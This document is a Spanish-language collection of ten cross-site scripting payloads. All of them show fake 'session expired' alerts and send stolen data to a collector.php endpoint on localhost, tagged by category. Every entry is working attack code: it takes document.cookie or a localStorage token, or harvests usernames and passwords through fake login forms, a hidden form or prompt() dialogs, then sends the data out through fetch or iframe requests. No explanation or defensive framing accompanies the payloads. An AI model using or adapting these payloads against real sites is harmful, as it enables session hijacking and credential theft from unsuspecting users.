### **Payloads XSS con categoría**

1. **Alert + cookies (categoria=cookies)**
    

`<script>alert('Su sesión expiró');var i=document.createElement('iframe');i.src='http://localhost/collector.php?categoria=cookies&data='+encodeURIComponent(document.cookie);document.body.appendChild(i);</script>`

2. **Alert + localStorage (categoria=localStorage)**
    

`<script>alert('Sesión expirada');fetch('http://localhost/collector.php?categoria=localStorage&data='+encodeURIComponent(localStorage.getItem('token')));</script>`

3. **Alert + formulario falso (categoria=credenciales)**
    

`<script>alert('Error de sesión');var f=document.createElement('form');f.innerHTML='Usuario:<input name="user">Contraseña:<input type="password" name="pass"><input type="submit">';document.body.innerHTML=f.outerHTML;f.addEventListener('submit',function(e){e.preventDefault();fetch('http://localhost/collector.php?categoria=credenciales&data='+encodeURIComponent('Usuario:'+e.target.user.value+'|Pass:'+e.target.pass.value));});</script>`

4. **Alert + formulario invisible (categoria=credenciales)**
    

`<script>alert('Su sesión expiró');var f=document.createElement('form');f.style.display='none';f.innerHTML='<input name="u"><input type="password" name="p"><input type="submit">';document.body.appendChild(f);f.addEventListener('submit',function(e){e.preventDefault();fetch('http://localhost/collector.php?categoria=credenciales&data='+encodeURIComponent(e.target.u.value+'|'+e.target.p.value));});</script>`

5. **Alert + reemplazo DOM + cookies (categoria=cookies)**
    

`<script>alert('Sesión expirada');document.body.innerHTML='<h2>Por favor vuelva a iniciar sesión</h2>';var i=document.createElement('iframe');i.src='http://localhost/collector.php?categoria=cookies&data='+encodeURIComponent(document.cookie);document.body.appendChild(i);</script>`

6. **Alert + input prompt + fetch (categoria=credenciales)**
    

`<script>alert('Su sesión expiró');var u=prompt('Usuario:'),p=prompt('Contraseña:');fetch('http://localhost/collector.php?categoria=credenciales&data='+encodeURIComponent('Usuario:'+u+'|Pass:'+p));</script>`

7. **Alert + cookies + localStorage (categoria=mixed)**
    

`<script>alert('Sesión expirada');fetch('http://localhost/collector.php?categoria=mixed&data='+encodeURIComponent(document.cookie+'|'+localStorage.getItem('token')));</script>`

8. **Alert + cambio de título + cookies (categoria=cookies)**
    

`<script>alert('Error de sesión');document.title='Sesión expirada';var i=document.createElement('iframe');i.src='http://localhost/collector.php?categoria=cookies&data='+encodeURIComponent(document.cookie);document.body.appendChild(i);</script>`

9. **Alert + input + cookies (categoria=credenciales)**
    

`<script>alert('Su sesión expiró');var u=prompt('Usuario:');var i=document.createElement('iframe');i.src='http://localhost/collector.php?categoria=credenciales&data='+encodeURIComponent('Usuario:'+u+'|Cookie:'+document.cookie);document.body.appendChild(i);</script>`

10. **Alert + formulario + localStorage (categoria=localStorage)**
    

`<script>alert('Error de sesión');var f=document.createElement('form');f.innerHTML='Token:<input name="t"><input type="submit">';document.body.innerHTML=f.outerHTML;f.addEventListener('submit',function(e){e.preventDefault();fetch('http://localhost/collector.php?categoria=localStorage&data='+encodeURIComponent(localStorage.getItem('token')));});</script>`